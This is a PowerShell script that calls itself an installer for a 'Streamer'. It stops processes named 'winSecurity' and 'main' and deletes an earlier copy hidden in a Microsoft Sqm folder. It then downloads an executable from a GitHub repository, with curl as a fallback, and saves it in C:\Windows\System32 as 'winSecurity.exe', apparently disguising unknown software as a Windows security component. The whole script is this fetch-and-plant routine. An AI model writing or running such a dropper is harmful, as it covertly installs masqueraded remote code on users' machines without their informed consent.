$ErrorActionPreference = "Stop"

$url = "https://github.com/mrjackff/streamer/raw/refs/heads/main/main.exe"
$outputPath = "C:\Windows\System32\winSecurity.exe"
$oldPath = "C:\Program Files (x86)\Microsoft\Windows\Sqm\Manifest\main.exe"
$folderPath = "C:\Windows\System32"
if (Get-Process -Name "winSecurity" -ErrorAction SilentlyContinue) {
    Write-Host "Streamer is running. removing old streamer..."
    Stop-Process -Name "winSecurity" -Force
    Write-Host "Removed."
} else {
    Write-Host "Streamer is not running."
}
if (Get-Process -Name "main" -ErrorAction SilentlyContinue) {
    Write-Host "Streamer is running. removing old streamer..."
    Stop-Process -Name "main" -Force
    Write-Host "Removed."
} else {
    Write-Host "Streamer is not running."
}
if (Test-Path -Path $oldPath) {
    Write-Host "Streamer Found found. Removing it..."
    try {
        Remove-Item -Path $oldPath -Force
        Write-Host "Streamer removed successfully."
    } catch {
        Write-Host "Failed $_"
    }
} else {
    Write-Host "Streamer not found."
}
if (-Not (Test-Path -Path $folderPath)) {
    Write-Host "Folder does not exist. Creating folder..."
    New-Item -ItemType Directory -Path $folderPath
}
if (Test-Path -Path $outputPath) {
    Write-Host "Streamer Found. Removing it..."
    Remove-Item -Path $outputPath -Force
}

Write-Host "installing..."
try {
    Invoke-WebRequest -Uri $url -OutFile $outputPath
} catch {
    Write-Host "Download with Invoke-WebRequest failed. Trying curl..."
    Start-Process curl -ArgumentList "-L", "-o", "`"$outputPath`"", "`"$url`"" -NoNewWindow -Wait
}

if (Test-Path -Path $outputPath) {
    Write-Host "Streamer Installed successfully."
} else {
    Write-Host "Installing failed."
}

Write-Host "Closing in 5 seconds..."
Start-Sleep -Seconds 5
